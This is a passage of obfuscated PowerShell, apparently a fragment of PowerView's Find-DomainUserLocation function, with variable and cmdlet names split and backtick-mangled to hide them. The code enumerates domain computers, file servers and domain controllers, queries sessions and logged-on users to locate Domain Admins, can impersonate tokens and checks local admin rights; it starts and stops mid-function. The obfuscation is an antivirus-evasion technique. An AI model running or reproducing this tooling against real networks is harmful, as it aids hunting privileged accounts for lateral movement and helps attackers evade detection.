        ${U`SE`Rg`RoUPID`enTi`Ty} = ("{3}{1}{2}{4}{0}"-f 's','in',' ','Doma','Admin'),

        [Alias({"{0}{2}{1}" -f'Ad','nCount','mi'})]
        [Switch]
        ${uSER`Ad`m`inCO`UNt},

        [Alias({"{1}{0}{2}{3}" -f 'lowDele','Al','gat','ion'})]
        [Switch]
        ${UsERAllo`W`d`ELE`gaT`i`oN},

        [Switch]
        ${ChEc`kac`CESS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{2}{3}{0}" -f'r','Doma','trol','le','inCon'})]
        [String]
        ${serV`eR},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{2}{1}" -f'On','el','eLev'}, {"{0}{1}"-f 'S','ubtree'})]
        [String]
        ${sEar`c`hscope} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`sULTpa`ge`size} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRveRT`iMe`LI`mit},

        [Switch]
        ${toM`BSTo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Rede`NT`Ial} =  ( &("{0}{1}"-f'i','Tem')  ("varIa"+"b"+"LE:5r0V"+"K")  )."VAL`UE"::"EmP`TY",

        [Switch]
        ${st`O`pON`SUcCeSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`ELaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`i`TtEr} = .3,

        [Parameter(PAraMEtErSetnAME = "S`h`owAlL")]
        [Switch]
        ${shoW`AlL},

        [Switch]
        ${ste`Al`Th},

        [String]
        [ValidateSet('DFS', 'DC', {"{1}{0}" -f 'ile','F'}, 'All')]
        ${sTE`A`ltH`S`oURCe} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${t`h`ReaDS} = 20
    )

    BEGIN {

        ${comPUT`ErSEaRc`h`ERaR`Gum`eNts} = @{
            ("{2}{0}{1}" -f 'ropert','ies','P') = ("{1}{0}{2}"-f'ns','d','hostname')
        }
        if (${PsbOU`Nd`PAR`A`mETERS}[("{1}{0}"-f 'in','Doma')]) { ${c`OMPutErSEA`RC`hera`R`guMeN`Ts}[("{1}{0}"-f'main','Do')] = ${DoM`AIN} }
        if (${PSbOuN`dPA`Ra`Me`TE`RS}[("{1}{0}{2}" -f't','Compu','erDomain')]) { ${CoMpU`Te`RS`EA`RChERargU`mEntS}[("{1}{0}" -f 'in','Doma')] = ${c`OM`p`U`TerDOMaIN} }
        if (${Ps`BOun`dPa`RAm`ETErs}[("{1}{3}{0}{2}" -f'terLDAPFil','Co','ter','mpu')]) { ${COmpUTe`R`S`E`ARCHerA`RguMents}[("{0}{1}{2}"-f 'LDA','PFi','lter')] = ${C`oMPUTerlD`APf`iL`TEr} }
        if (${Psbou`N`dp`A`RAmeteRS}[("{2}{0}{1}{3}"-f 'terSearc','hB','Compu','ase')]) { ${cOMP`UTE`RseARcHerar`gu`M`entS}[("{1}{2}{0}" -f'ase','S','earchB')] = ${COmp`U`Te`R`Sea`Rc`hbasE} }
        if (${PS`BOUndPA`RaMetE`Rs}[("{0}{2}{1}"-f'Unconst','ed','rain')]) { ${Co`mPUter`seaRChER`Arg`U`meNTs}[("{0}{2}{1}{3}" -f'Un','stra','con','ined')] = ${unc`on`sTRa`i`Ned} }
        if (${PSBOunDpa`R`A`mE`Ters}[("{1}{2}{0}{5}{4}{6}{3}"-f'e','Compu','t','stem','Operati','r','ngSy')]) { ${cOMpUTE`Rse`ArchERAr`gUmE`NTs}[("{0}{4}{3}{1}{2}" -f'Op','ngSyste','m','ti','era')] = ${opeR`ATiN`g`Sy`StEm} }
        if (${psbouND`PAr`AMe`T`e`RS}[("{5}{4}{2}{3}{0}{1}"-f 'Serv','icePack','te','r','pu','Com')]) { ${CoMpUTER`S`eArC`HE`RARGU`Me`N`TS}[("{2}{3}{0}{1}" -f 'Pa','ck','Ser','vice')] = ${SErV`icE`PaCK} }
        if (${psBoU`NdPAramE`TE`Rs}[("{1}{2}{4}{3}{0}"-f 'Name','Com','pu','ite','terS')]) { ${coMpUTErsear`che`RaRg`UM`eNtS}[("{1}{0}{2}"-f 'e','Sit','Name')] = ${si`T`eNA`mE} }
        if (${PSbOUnDpA`Ra`M`ETErs}[("{1}{0}" -f 'er','Serv')]) { ${c`om`pUterS`Earc`hERaR`G`UM`E`NtS}[("{1}{0}"-f 'r','Serve')] = ${s`ERV`er} }
        if (${PSBo`UnDP`A`RaMeTerS}[("{1}{2}{0}" -f'Scope','Se','arch')]) { ${cOmpu`TErSe`Arc`HER`ARGUm`E`Nts}[("{2}{1}{0}"-f 'ope','Sc','Search')] = ${seA`Rc`hscopE} }
        if (${pSB`OUND`p`ARAmET`ers}[("{1}{3}{2}{4}{0}"-f'ze','Resu','t','l','PageSi')]) { ${CoMPu`T`eRseARChera`RguMEN`Ts}[("{3}{1}{0}{2}" -f'Si','e','ze','ResultPag')] = ${Res`Ul`TPAGE`si`Ze} }
        if (${P`sB`OunDParA`MetErs}[("{0}{3}{1}{2}"-f'S','verTim','eLimit','er')]) { ${c`oMpU`TERse`ARcheraRgum`eNts}[("{3}{0}{2}{1}"-f 'erve','imit','rTimeL','S')] = ${sER`V`eR`TiMelimit} }
        if (${p`Sbo`UNdp`Ara`MeTE`RS}[("{1}{0}{2}" -f'b','Tom','stone')]) { ${compUTErsEArC`HeRa`R`G`UmENTs}[("{2}{1}{0}"-f 'bstone','m','To')] = ${tOMb`S`ToNe} }
        if (${PS`BOundpA`RAMEte`RS}[("{0}{2}{1}"-f'Crede','l','ntia')]) { ${COmp`UtE`RS`ear`cHErArGuMenTS}[("{2}{0}{1}" -f'tia','l','Creden')] = ${CReDeNt`i`AL} }

        ${uSeR`S`EArCHEr`ARgumE`NTs} = @{
            ("{1}{0}{2}"-f 'pe','Pro','rties') = ("{0}{2}{3}{4}{1}" -f 'sama','e','ccou','ntn','am')
        }
        if (${pS`B`ouNdpa`Ra`me`TERs}[("{3}{2}{0}{1}" -f 'n','tity','rIde','Use')]) { ${UsErSEAR`CHeRArg`Um`E`NTS}[("{1}{0}" -f 'tity','Iden')] = ${useRiD`e`NtITY} }
        if (${PSB`oUnd`paRam`e`TErS}[("{1}{0}{2}"-f 'ai','Dom','n')]) { ${uSE`RSeaRc`heR`Ar`GUM`ENts}[("{2}{1}{0}"-f 'ain','om','D')] = ${d`O`maiN} }
        if (${Ps`BOU`NDpaRAMeT`ERS}[("{0}{1}{2}"-f'Use','r','Domain')]) { ${u`SeR`seaRch`EraRGUMe`NTs}[("{1}{0}" -f 'omain','D')] = ${Use`Rdoma`in} }
        if (${PSBoUndPa`RamET`E`RS}[("{1}{2}{0}{3}"-f 'DAP','Use','rL','Filter')]) { ${uSer`SeA`RcHeRAR`Gum`ENTS}[("{0}{2}{1}" -f'LDAP','ilter','F')] = ${u`se`R`l`dAPfILter} }
        if (${psbOuNdP`AR`AMeT`ErS}[("{0}{3}{2}{4}{1}"-f'User','se','hB','Searc','a')]) { ${UsEr`S`earC`HeR`A`RGUMe`NtS}[("{1}{2}{0}" -f'rchBase','S','ea')] = ${uSe`Rs`EAR`cHb`AsE} }
        if (${ps`B`Oundpa`RAmeterS}[("{1}{2}{0}" -f'nt','UserA','dminCou')]) { ${u`SERsEarCh`ERa`RgUMeNts}[("{1}{2}{0}" -f'ount','Adm','inC')] = ${uS`ErA`dMi`NC`oUNT} }
        if (${pSbOU`NDpa`Ramet`ers}[("{2}{0}{6}{4}{3}{5}{1}"-f'serA','n','U','t','Delega','io','llow')]) { ${u`sE`RSe`ArCheRAr`g`UmEN`TS}[("{2}{1}{3}{0}" -f 'legation','w','Allo','De')] = ${UseRALLOWdE`lEga`T`IOn} }
        if (${p`sBoUNDp`A`RaMeTErs}[("{0}{1}"-f 'Serve','r')]) { ${Us`ERSEA`Rch`erARGuMe`NTS}[("{1}{2}{0}" -f'r','S','erve')] = ${S`E`RVeR} }
        if (${p`sbou`N`DPaRAM`EtERs}[("{3}{0}{1}{2}" -f 'arc','hScop','e','Se')]) { ${use`Rse`ARCh`ERa`Rg`U`MEnts}[("{0}{3}{1}{2}"-f 'S','rchSc','ope','ea')] = ${Se`ArChS`cO`pe} }
        if (${Ps`BouNdPA`Ram`ET`ers}[("{1}{2}{3}{0}"-f'e','ResultPageS','i','z')]) { ${U`SERsea`RCHEraR`G`U`MeNts}[("{1}{4}{0}{3}{2}" -f 'ltPage','R','ze','Si','esu')] = ${RES`UL`TpaGE`Si`Ze} }
        if (${PSBOU`N`dpA`R`AmET`Ers}[("{3}{1}{0}{2}"-f'L','me','imit','ServerTi')]) { ${uSe`RSEArCh`E`RaRguM`eNTS}[("{1}{3}{2}{0}" -f 'Limit','S','erTime','erv')] = ${S`erV`eRT`iMELI`mIt} }
        if (${p`sbO`UNDparA`M`etErs}[("{2}{1}{0}"-f 'one','st','Tomb')]) { ${usErS`eArCHe`RArgu`m`e`N`TS}[("{2}{0}{1}" -f 'mbst','one','To')] = ${ToMBST`o`NE} }
        if (${psbOu`NdPar`AME`TeRS}[("{2}{1}{0}" -f'l','edentia','Cr')]) { ${uS`eRSeArch`E`R`ARgU`me`NTs}[("{2}{0}{1}"-f'nt','ial','Crede')] = ${cr`eDent`I`Al} }

        ${targE`TC`OmPUTE`Rs} = @()

        
        if (${psb`ouN`DparamET`ers}[("{1}{0}{2}"-f'ompute','C','rName')]) {
            ${Ta`RG`E`TCOMp`UTERs} = @(${c`OMPut`Er`N`AMe})
        }
        else {
            if (${psBOUN`dPARa`ME`T`E`RS}[("{1}{0}"-f 'tealth','S')]) {
                &("{3}{0}{1}{2}"-f 'i','te-Ver','bose','Wr') ('[Fi'+'nd-D'+'omai'+'nUserL'+'o'+'cati'+'o'+'n] '+'St'+'eal'+'th '+'enum'+'eration'+' '+'using'+' '+'sou'+'rce: '+"$StealthSource")
                ${T`ArGETc`omp`Ute`Rar`RAyl`Ist} = &("{0}{2}{1}" -f 'New','ct','-Obje') ("{6}{1}{7}{0}{4}{3}{5}{2}" -f 'ol','ystem.','List','s.','lection','Array','S','C')

                if (${s`T`EalT`HSOuRCe} -match ((("{3}{0}{1}{2}" -f 'lesTtA','l','l','Fi')) -cRepLAce 'sTt',[CHar]124)) {
                    &("{2}{0}{1}" -f 'ite-Verbos','e','Wr') ("{4}{2}{9}{5}{1}{7}{8}{3}{6}{0}"-f'vers','Q','ind-Domai','ile s','[F','ocation] ','er','uerying ','for f','nUserL')
                    ${FiLeservE`RSEA`R`Ch`eRArg`Uments} = @{}
                    if (${PS`BO`UND`PAramete`RS}[("{1}{0}"-f'in','Doma')]) { ${F`iLesErve`RSeArcH`EraRgUMEN`Ts}[("{0}{1}" -f'Domai','n')] = ${DOmA`IN} }
                    if (${psBOu`Nd`Pa`Ra`MetERS}[("{2}{1}{0}{3}"-f 'terD','ompu','C','omain')]) { ${filESerVErseArChERA`R`gU`MeN`TS}[("{0}{1}"-f'Dom','ain')] = ${cOMPu`T`Erdoma`in} }
                    if (${PsbOU`Nd`p`ARameterS}[("{3}{5}{1}{2}{0}{4}"-f 'h','Sear','c','Compu','Base','ter')]) { ${f`iLE`Serv`eRsEa`R`C`hER`ArGumEN`TS}[("{2}{3}{1}{0}" -f 'Base','h','Sear','c')] = ${C`oMpuTer`sEa`R`chb`AsE} }
                    if (${p`s`B`OUN`dPAra`MeteRS}[("{2}{1}{0}"-f'ver','er','S')]) { ${FIle`s`erver`SEar`cHerArGUments}[("{1}{0}" -f'erver','S')] = ${sE`Rv`er} }
                    if (${PsbOun`d`paR`AmE`Ters}[("{1}{2}{0}" -f 'cope','Sear','chS')]) { ${F`iL`ESerVeRseAr`CH`eraRGumEnts}[("{2}{0}{1}{3}" -f 'rc','h','Sea','Scope')] = ${se`ArC`HsCO`Pe} }
                    if (${psbO`UNDP`Aram`EteRs}[("{2}{0}{1}" -f 'ultPage','Size','Res')]) { ${FIle`SE`RV`E`RS`EArcherArGU`m`eNTs}[("{4}{0}{1}{2}{3}" -f 'sul','tPag','e','Size','Re')] = ${resu`l`TPAg`esIze} }
                    if (${psbO`UNDpA`RAMete`Rs}[("{2}{3}{0}{1}"-f'rTim','eLimit','S','erve')]) { ${FilEserveRsE`ARcHeR`ARG`U`Ments}[("{1}{2}{3}{4}{0}" -f'it','Se','rver','Ti','meLim')] = ${S`eRv`ER`TIMELi`M`iT} }
                    if (${ps`BoUnD`p`ARA`ME`TErS}[("{0}{1}{2}" -f'T','o','mbstone')]) { ${F`ILesERV`e`RsEaR`cheRarGUM`EntS}[("{2}{0}{1}" -f'omb','stone','T')] = ${TO`M`Bst`One} }
                    if (${psbo`U`ND`PARam`EtERs}[("{1}{0}{3}{2}"-f'e','Cr','ential','d')]) { ${F`IleSER`VeRsEa`RCh`eraRGUM`ents}[("{3}{2}{0}{1}"-f'entia','l','d','Cre')] = ${c`Rede`NTI`Al} }
                    ${fiL`eSe`R`VERs} = &("{0}{1}{3}{2}{4}"-f'Get-D','om','inFile','a','Server') @FileServerSearcherArguments
                    if (${F`ILESERV`E`Rs} -isnot [System.Array]) { ${FIl`eSE`R`Vers} = @(${filE`SeR`VErS}) }
                    ${t`A`RGetCompu`TEraRr`A`YLi`ST}.("{1}{0}"-f 'ge','AddRan').Invoke( ${FI`lEsErvE`RS} )
                }
                if (${sTeA`L`TH`SOur`ce} -match ((("{1}{2}{0}"-f 'All','DFS','S2x'))."REP`L`ACE"('S2x',[sTRinG][Char]124))) {
                    &("{2}{3}{1}{0}" -f'ose','rb','Wr','ite-Ve') ("{1}{12}{4}{2}{9}{0}{3}{13}{7}{11}{10}{8}{6}{14}{5}"-f'c','[Find-Dom','rL','at','se','FS servers','r ',']','fo','o','ng ',' Queryi','ainU','ion','D')
                    
                    
                }
                if (${s`TEaLThS`oUr`ce} -match ((("{2}{1}{0}"-f 'Z6All','CB','D')).("{1}{0}{2}"-f'PL','Re','AcE').Invoke('BZ6','|'))) {
                    &("{1}{2}{0}" -f'bose','Write','-Ver') ("{10}{4}{6}{7}{0}{2}{9}{5}{8}{3}{1}" -f 'Que','rollers','ryin','cont','oca','for dom','t','ion] ','ain ','g ','[Find-DomainUserL')
                    ${DCSEA`RC`h`E`R`A`RguMentS} = @{
                        ("{1}{0}"-f'P','LDA') = ${T`Rue}
                    }
                    if (${Psbo`Un`dParaMete`Rs}[("{0}{1}" -f 'Do','main')]) { ${d`cS`e`ArchEr`AR`GuMEnTS}[("{1}{0}"-f'ain','Dom')] = ${D`o`MAiN} }
                    if (${p`S`BOUN`D`parAM`eTErs}[("{3}{2}{0}{1}" -f'erD','omain','omput','C')]) { ${dcSEaR`C`HERaR`gUmeNts}[("{1}{2}{0}" -f 'in','D','oma')] = ${co`M`pUtERD`om`AIN} }
                    if (${PsbOUND`PA`Ram`Ete`Rs}[("{0}{1}"-f 'Se','rver')]) { ${DCs`eARc`He`RaRGU`mENTs}[("{1}{0}{2}" -f 'v','Ser','er')] = ${sE`RvER} }
                    if (${ps`BoU`N`dpAr`A`MeTerS}[("{0}{1}{2}" -f 'Cred','entia','l')]) { ${D`C`sE`ARc`hEraRGu`mEntS}[("{0}{1}{2}"-f 'C','redent','ial')] = ${CR`e`D`EntIAl} }
                    ${DOMa`iNc`OnTR`O`L`LerS} = &("{1}{6}{3}{5}{4}{0}{2}" -f 'rol','G','ler','-D','nt','omainCo','et') @DCSearcherArguments | &("{1}{0}{2}{4}{3}"-f 'le','Se','ct-O','ject','b') -ExpandProperty ("{1}{0}{3}{2}"-f'hostn','dns','e','am')
                    if (${doMA`InCoNtR`oLLe`RS} -isnot [System.Array]) { ${DO`MaINc`o`N`TrOllErs} = @(${dO`m`AiNCO`NtrOlLE`Rs}) }
                    ${TArgE`T`cOmPUT`E`RARRAyL`ISt}.("{1}{0}"-f 'e','AddRang').Invoke( ${d`Oma`I`NcoNtROLl`ERs} )
                }
                ${ta`R`G`E`TcOMpuTErS} = ${TaRg`etcOmpUTerAr`RaY`li`ST}.("{1}{0}"-f'oArray','T').Invoke()
            }
            else {
                &("{2}{3}{1}{0}" -f'e','os','Wri','te-Verb') ("{10}{4}{11}{2}{3}{0}{12}{6}{8}{1}{5}{7}{9}"-f'for','n the d',' Quer','ying ','nUserLocati','o','ters','ma',' i','in','[Find-Domai','on]',' all compu')
                ${taRG`e`T`comPU`TeRs} = &("{3}{0}{1}{2}" -f '-DomainCompu','t','er','Get') @ComputerSearcherArguments | &("{2}{3}{1}{0}{4}" -f 'jec','-Ob','Sel','ect','t') -ExpandProperty ("{1}{0}{3}{2}" -f 'shost','dn','e','nam')
            }
        }
        &("{3}{1}{0}{2}"-f 'Verb','ite-','ose','Wr') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${tArG`E`TC`OMPUt`Ers}."LE`N`GTH" -eq 0) {
            throw ("{2}{0}{4}{1}{3}{5}{9}{8}{7}{6}" -f'ma','ocatio','[Find-Do','n] No hosts fo','inUserL','und','numerate','e','o ',' t')
        }

        
        if (${PSbo`UN`d`p`AraM`ETers}[("{2}{1}{0}"-f 'ntial','de','Cre')]) {
            ${CurrEnTU`S`eR} = ${c`REDE`N`TIAL}.("{3}{0}{2}{1}" -f 'tNetwo','tial','rkCreden','Ge').Invoke()."uS`e`RnAME"
        }
        else {
            ${cu`R`Ren`TusEr} = ( ( &("{1}{0}" -f 'LE','VarIab')  ("{1}{0}" -f'2en','d')  )."vAL`UE"::"u`sE`RName").("{0}{2}{1}" -f 'T','r','oLowe').Invoke()
        }

        
        if (${Ps`BouN`DpARamet`E`RS}[("{1}{0}" -f 'owAll','Sh')]) {
            ${T`ARg`eTUSErS} = @()
        }
        elseif (${psboUn`dp`AraM`etERS}[("{0}{1}{2}{3}" -f 'User','I','d','entity')] -or ${pSboUn`DP`ArAMeT`erS}[("{2}{1}{3}{0}"-f'r','rLD','Use','APFilte')] -or ${PSB`oU`NdPa`Ram`eTe`RS}[("{4}{3}{0}{2}{1}" -f 'ar','Base','ch','Se','User')] -or ${p`sboU`N`dP`AR`AmeTeRs}[("{2}{3}{0}{1}{4}"-f'minCo','un','U','serAd','t')] -or ${PS`BOUndp`ARAm`e`Ters}[("{3}{0}{2}{5}{1}{4}"-f 'rAll','at','ow','Use','ion','Deleg')]) {
            ${t`ArG`EtUSe`RS} = &("{2}{4}{0}{1}{3}" -f'nU','s','Get-D','er','omai') @UserSearcherArguments | &("{3}{2}{1}{0}"-f 'ject','b','elect-O','S') -ExpandProperty ("{0}{3}{2}{1}"-f'sam','ame','n','account')
        }
        else {
            ${GRoUpsEaRc`H`erArg`Umen`Ts} = @{
                ("{1}{2}{0}"-f 'ntity','I','de') = ${us`ergrou`pI`DENtiTY}
                ("{2}{1}{0}" -f 'se','cur','Re') = ${T`Rue}
            }
            if (${P`sbOU`Nd`paRa`Me`TeRs}[("{1}{2}{0}"-f'in','UserDom','a')]) { ${g`R`OUps`eARc`H`ErARGumE`Nts}[("{0}{1}"-f 'D','omain')] = ${uSeRdo`M`Ain} }
            if (${psbOu`N`dpARaMe`TE`RS}[("{1}{0}{2}" -f'erSearchB','Us','ase')]) { ${Grou`P`SeaR`chER`ARGuMeNTs}[("{0}{2}{1}" -f'SearchB','se','a')] = ${uS`E`R`S`EArcHbaSE} }
            if (${psbOUnDPa`RamE`Te`RS}[("{1}{0}"-f 'er','Serv')]) { ${Gr`OUpsE`Ar`C`H`ER`ARGumENts}[("{1}{0}{2}" -f'rv','Se','er')] = ${sEr`V`ER} }
            if (${PsBoUNd`p`Ar`Am`eTeRs}[("{1}{0}{2}" -f'arc','Se','hScope')]) { ${GRoUPseArCHERa`R`g`UmENTs}[("{1}{2}{0}" -f'archScope','S','e')] = ${searc`hSCO`pe} }
            if (${PsBoUndp`ARa`me`TeRs}[("{4}{0}{3}{2}{1}"-f 's','eSize','g','ultPa','Re')]) { ${gr`ouP`sEa`RChERARgumE`NtS}[("{2}{3}{1}{4}{0}" -f'ze','sultPag','R','e','eSi')] = ${reS`U`LtpAgeS`ize} }
            if (${ps`BOU`NdParA`mEt`eRS}[("{3}{2}{0}{1}{4}" -f'r','TimeL','ve','Ser','imit')]) { ${GROuPsE`ARC`H`eRa`RG`UmE`Nts}[("{2}{0}{1}{3}" -f'm','i','ServerTimeLi','t')] = ${s`ER`VeR`TimEliMIT} }
            if (${PSb`o`Undp`AraMETers}[("{2}{0}{1}"-f 'ton','e','Tombs')]) { ${g`ROupSearCHER`Arg`UM`EN`Ts}[("{1}{0}{2}" -f'bst','Tom','one')] = ${toMb`ST`ONe} }
            if (${P`SBO`Un`Dp`ARAMEters}[("{3}{0}{2}{1}" -f'i','l','a','Credent')]) { ${grouPsEarCHE`R`A`Rg`UMEnts}[("{2}{0}{1}" -f'ia','l','Credent')] = ${crE`d`eN`TIal} }
            ${TA`RgE`Tuse`RS} = &("{1}{2}{3}{5}{4}{0}" -f'pMember','G','et-D','o','rou','mainG') @GroupSearcherArguments | &("{1}{3}{2}{0}"-f'ject','Selec','Ob','t-') -ExpandProperty ("{0}{1}{2}" -f'Membe','rNam','e')
        }

        &("{2}{0}{1}"-f 'erbo','se','Write-V') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${S`H`oWALL}) -and (${taRge`Tu`sE`Rs}."len`gtH" -eq 0)) {
            throw ("{12}{3}{1}{11}{6}{9}{7}{5}{10}{2}{4}{8}{0}"-f 'o target','ainUse','s','Dom',' ','] No','ati','n','found t','o',' user','rLoc','[Find-')
        }

        
        ${hoS`Te`NumBL`O`ck} = {
            Param(${coM`pu`TeRnAME}, ${TArgE`T`U`SERS}, ${cURR`Ent`U`SER}, ${SteA`L`Th}, ${TOKe`NH`Andle})

            if (${t`O`KENHandLE}) {
                
                ${nU`lL} = &("{0}{4}{2}{3}{1}" -f 'In','ation','oke-UserImp','erson','v') -TokenHandle ${tOken`ha`NDLE} -Quiet
            }

            ForEach (${Ta`RG`e`TcomPUTer} in ${C`omPuTE`RNA`ME}) {
                ${UP} = &("{1}{2}{0}{3}"-f'ctio','Tes','t-Conne','n') -Count 1 -Quiet -ComputerName ${tA`RG`eTCoMpU`TER}
                if (${UP}) {
                    ${s`es`s`IOnS} = &("{2}{3}{0}{1}"-f'tSe','ssion','Get','-Ne') -ComputerName ${tAr`GEtcOmpU`TEr}
                    ForEach (${SeS`si`ON} in ${s`e`SSiOnS}) {
                        ${u`se`RName} = ${sEs`si`ON}."u`SE`RNAME"
                        ${c`Name} = ${SEsS`i`On}."cna`ME"

                        if (${cN`Ame} -and ${C`NA`Me}.("{0}{3}{1}{2}" -f 'S','sW','ith','tart').Invoke('\\')) {
                            ${cn`A`mE} = ${cN`A`me}.("{0}{1}{2}" -f 'TrimS','t','art').Invoke('\')
                        }

                        
                        if ((${uSe`Rna`Me}) -and (${Us`E`RName}.("{0}{1}" -f'Tri','m').Invoke() -ne '') -and (${useR`NaMe} -notmatch ${Cu`RREn`T`USeR}) -and (${usE`RNA`Me} -notmatch '\$$')) {

                            if ( (-not ${Tar`gEt`USE`Rs}) -or (${t`ArgEt`USErS} -contains ${US`ERN`Ame})) {
                                ${UsERl`oca`Ti`on} = &("{0}{1}{2}{3}"-f'New','-Obje','c','t') ("{1}{2}{0}" -f'Object','P','S')
                                ${useRLOC`A`Ti`on} | &("{3}{2}{0}{1}" -f 'M','ember','-','Add') ("{0}{1}{2}{3}"-f 'Not','e','pr','operty') ("{3}{0}{1}{2}" -f'oma','i','n','UserD') ${n`Ull}
                                ${uSERLO`CAti`on} | &("{1}{0}{2}" -f'd-Mem','Ad','ber') ("{2}{0}{1}"-f 'ert','y','Noteprop') ("{1}{0}"-f 'e','UserNam') ${U`SE`RnamE}
                                ${Us`erLOc`A`TiOn} | &("{2}{1}{0}"-f'ember','-M','Add') ("{3}{1}{2}{0}" -f 'ty','prop','er','Note') ("{0}{3}{2}{1}"-f'Com','rName','te','pu') ${t`ARgETC`oMp`Uter}
                                ${uS`ErLOc`At`iON} | &("{1}{0}{2}{3}" -f 'd-M','Ad','em','ber') ("{2}{1}{3}{0}"-f 'ty','op','Notepr','er') ("{3}{0}{1}{2}"-f'essio','nF','rom','S') ${C`NaME}

                                
                                try {
                                    ${Cn`AMEDn`SnamE} =   (&("{1}{2}{0}"-f 't-iteM','G','e')  ("{3}{1}{2}{0}"-f'usKf1','bLe',':a','vARIa')  )."va`lue"::("{3}{2}{1}{0}"-f 'Entry','t','etHos','G').Invoke(${cNa`mE}) | &("{3}{0}{2}{1}" -f 'elect-Obje','t','c','S') -ExpandProperty ("{0}{1}"-f 'Host','Name')
                                    ${Use`RLO`CaTi`ON} | &("{0}{2}{1}"-f'Ad','mber','d-Me') ("{2}{3}{0}{1}"-f 'ope','rty','Note','Pr') ("{0}{1}{2}{3}"-f'S','es','sio','nFromName') ${CnaMEdn`sna`Me}
                                }
                                catch {
                                    ${USeR`LocA`TiOn} | &("{0}{1}{2}"-f 'Add','-M','ember') ("{0}{1}{2}"-f'No','te','Property') ("{1}{4}{2}{3}{0}" -f 'Name','Sessio','o','m','nFr') ${Nu`Ll}
                                }

                                
                                if (${c`he`ckACc`EsS}) {
                                    ${A`dmin} = (&("{3}{1}{0}{2}" -f '-','t','AdminAccess','Tes') -ComputerName ${C`NAme})."iSAD`m`in"
                                    ${uSer`L`OCATi`ON} | &("{0}{2}{1}"-f 'Ad','er','d-Memb') ("{1}{0}{2}" -f 'prope','Note','rty') ("{1}{2}{0}" -f'Admin','L','ocal') ${ad`m`in}."is`ADm`in"
                                }
                                else {
                                    ${us`ErLo`C`AtIon} | &("{2}{1}{3}{0}"-f 'ember','dd-','A','M') ("{2}{1}{0}{3}" -f'per','epro','Not','ty') ("{2}{0}{1}" -f'c','alAdmin','Lo') ${nu`LL}
                                }
                                ${uSeR`LO`ca`T`Ion}."ps`o`BJEct"."t`ypeN`AmeS".("{0}{1}" -f'Inser','t').Invoke(0, ("{3}{2}{4}{1}{0}" -f 'ion','Locat','owerView.Us','P','er'))
                                ${U`s`ErLo`CA`TioN}
                            }
                        }
                    }
                    if (-not ${S`T`eALth}) {
                        
                        ${loGg`eD`On} = &("{3}{2}{1}{0}"-f'gedon','NetLog','-','Get') -ComputerName ${TAR`G`e`TcO`mpuTer}
                        ForEach (${US`er} in ${LOGg`e`dOn}) {
                            ${uSE`R`NAME} = ${u`Ser}."usern`AME"
                            ${USerd`om`Ain} = ${u`sEr}."LoGOND`Om`AIN"

                            
                            if ((${UsERn`A`me}) -and (${u`serN`Ame}.("{0}{1}" -f'tri','m').Invoke() -ne '')) {
                                if ( (-not ${Ta`RG`E`TUSErS}) -or (${TARg`e`TuSers} -contains ${U`SerNamE}) -and (${uS`Erna`mE} -notmatch '\$$')) {
                                    ${I`pADDrE`SS} = @(&("{0}{1}{2}{3}" -f'R','es','olve','-IPAddress') -ComputerName ${TARG`Etc`o`mPu`TER})[0]."i`Pa`dDr`eSS"
                                    ${uSE`Rloc`ATI`oN} = &("{0}{2}{1}" -f'New-','ject','Ob') ("{2}{0}{1}" -f 'O','bject','PS')
                                    ${usER`lo`CaTIoN} | &("{2}{1}{0}{3}" -f'e','Memb','Add-','r') ("{0}{2}{3}{1}"-f'Notep','y','ro','pert') ("{1}{0}{2}"-f 'rDom','Use','ain') ${us`erdO`mAin}
                                    ${UsE`RL`OC`A`TIoN} | &("{1}{3}{0}{2}"-f'-','A','Member','dd') ("{2}{1}{0}" -f 'ty','er','Noteprop') ("{1}{0}" -f 'serName','U') ${U`SErna`Me}
                                    ${u`Se`RLocAtiOn} | &("{1}{0}{3}{2}" -f 'd','Ad','Member','-') ("{2}{1}{0}{3}" -f't','er','Noteprop','y') ("{1}{2}{0}"-f 'rName','Com','pute') ${tArgE`Tc`oM`pUteR}
                                    ${userLoCA`T`IOn} | &("{2}{1}{0}"-f '-Member','dd','A') ("{0}{1}{2}"-f'Notep','r','operty') ("{2}{0}{1}" -f'ddres','s','IPA') ${Ipad`DRe`Ss}
                                    ${u`seRL`Oca`TION} | &("{1}{0}{2}" -f 'e','Add-M','mber') ("{2}{0}{1}"-f'o','perty','Notepr') ("{1}{2}{3}{0}"-f'm','Ses','sionF','ro') ${N`UlL}
                                    ${USeRLo`C`ATion} | &("{2}{0}{1}"-f 'dd-Membe','r','A') ("{2}{1}{0}"-f 'rty','pe','Notepro') ("{1}{2}{3}{0}" -f'FromName','Se','s','sion') ${N`ULl}

                                    
                                    if (${C`HE`Ckacc`Ess}) {
                                        ${aD`M`In} = &("{2}{3}{4}{0}{1}" -f'cc','ess','Tes','t-Admi','nA') -ComputerName ${taRgeTcOM`P`U`TER}
                                        ${us`ERL`o`catiON} | &("{2}{3}{1}{0}" -f 'er','d-Memb','A','d') ("{2}{0}{1}{3}" -f 'p','e','Notepro','rty') ("{1}{0}{2}" -f'm','LocalAd','in') ${adm`In}."iS`AdmiN"
                                    }
                                    else {
                                        ${USerl`o`CA`Ti`On} | &("{0}{2}{1}"-f'Ad','r','d-Membe') ("{0}{3}{1}{2}"-f'Not','ert','y','eprop') ("{0}{2}{1}" -f'LocalA','in','dm') ${n`ULl}
                                    }
                                    ${uSE`R`l`ocAtION}."P`soB`jEcT"."t`yPEN`AmeS".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{1}{4}{5}{0}{2}{3}"-f'ew.User','Powe','Loca','tion','r','Vi'))
                                    ${Us`e`RLocAtiOn}
                                }
                            }
                        }
                    }
                }
            }

            if (${T`OKe`NhaNdLE}) {
                &("{1}{2}{0}{3}"-f'tT','Inv','oke-Rever','oSelf')
            }
        }

        ${l`oG`OntO`keN} = ${nu`Ll}
